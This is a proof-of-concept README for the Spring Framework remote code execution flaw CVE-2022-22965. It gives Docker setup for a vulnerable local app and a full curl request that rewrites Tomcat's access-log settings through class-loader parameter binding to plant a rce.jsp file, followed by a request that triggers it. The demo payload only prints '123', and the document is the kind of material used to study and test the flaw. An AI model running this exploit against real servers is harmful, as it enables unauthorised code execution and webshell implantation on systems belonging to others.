# CVE-2022-22965 PoC

Minimal example of how to reproduce CVE-2022-22965 Spring RCE.

## Build the application using Docker compose
```shell
docker-compose up --build
```

## Test the app
Browse to [http://localhost:8080/handling-form-submission-complete/greeting](http://localhost:8080/handling-form-submission-complete/greeting)

## Run the exploit
```shell
./exploits/run.sh
```

The exploit is going to create `rce.jsp` file in  `webapps/handling-form-submission-complete` on the web server.

## Use the exploit
Browse to [http://localhost:8080/handling-form-submission-complete/rce.jsp](http://localhost:8080/handling-form-submission-complete/rce.jsp)


# Alternative way

## 1. Run the Tomcat server

```shell
docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0
```

_Add `-p 5005:5005 -e "JAVA_OPTS=-Xdebug -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"` if you want to debug remotely._

## 2. Build the project

```shell
./mvnw install
```

## 3. Deploy the app

```shell
docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps
```

## 4. Write the exploit

```shell
curl -X POST \
  -H "pre:<%" \
  -H "post:;%>" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  http://localhost:8888/handling-form-submission-complete/greeting
```

The exploit is going to create `rce.jsp` file in  `webapps/handling-form-submission-complete` on the web server.

## Use the exploit

```shell
curl http://localhost:8888/handling-form-submission-complete/rce.jsp
```

Now you'll see `123` in the container's terminal.



The PoC based on https://gist.github.com/esell/c9731a7e2c5404af7716a6810dc33e1a
# spring-bean
